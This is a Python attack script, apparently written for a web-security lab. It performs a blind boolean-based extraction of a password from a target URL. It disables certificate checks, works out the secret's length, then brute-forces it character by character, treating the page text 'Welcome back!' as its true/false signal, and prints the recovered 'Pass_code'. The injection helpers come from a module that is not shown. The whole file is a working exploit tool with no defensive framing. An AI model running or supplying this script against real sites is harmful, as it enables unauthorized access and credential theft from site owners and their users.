import requests
from requests.utils import dict_from_cookiejar
from methods import find_number_of_chars,it_this_char
import sys
import urllib3
urllib3.disable_warnings()

if __name__=='__main__':
    try:
        url=sys.argv[1]
    except IndexError:
        print(f"[-] Syntax: python3 {sys.argv[0]} <url>")
        exit(-1)


    s=requests.Session()
    r=s.get(url,verify=False,timeout=5)
    cookies=dict_from_cookiejar(s.cookies)
    print("[+] determining number of chars...")
    no_chars=find_number_of_chars(s,url,cookies,"Welcome back!")
    print(f"[+] found : {no_chars}")
    print("Start brute force attack...\nResult :")
    results=[]
    alpha_num="abcdefghijklmnopqrstuvwxyz0123456789"
    pass_code=""
    for i in range(no_chars):
        print(f"\t[%] THe {i+1} char : ",end="")
        for j in alpha_num:
            res=it_this_char(s,url,i+1,j,cookies,"Welcome back!")
            if res[0]:
                print(res[1])
                pass_code+=res[1]
                break
    print("Pass_code :",pass_code)